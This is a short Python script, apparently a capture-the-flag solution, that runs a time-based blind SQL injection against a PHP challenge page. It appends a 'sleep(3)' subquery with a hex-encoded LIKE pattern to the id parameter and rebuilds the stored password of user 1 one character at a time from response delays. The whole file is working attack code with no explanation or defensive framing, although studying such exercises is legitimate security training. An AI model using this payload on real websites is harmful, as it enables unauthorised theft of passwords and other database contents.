import requests

alpha = [chr(i) for i in range(ord('a'), ord('z') + 1)]
found = ""
while True:
    for b in alpha:
        u = found + b + "%"
        print("U: {}".format(u))
        url = "http://chall.voilixa.ml/chall/Barragan.php?id=1 and (select sleep(3) from users where id=1 and password like " + "0x" + u.encode("utf-8").hex() + ")"
        response = requests.get(url)
        if response.elapsed.total_seconds() > 2:
            print("Matched {}: {}".format(u, response.elapsed.total_seconds()))
            found += str(b)
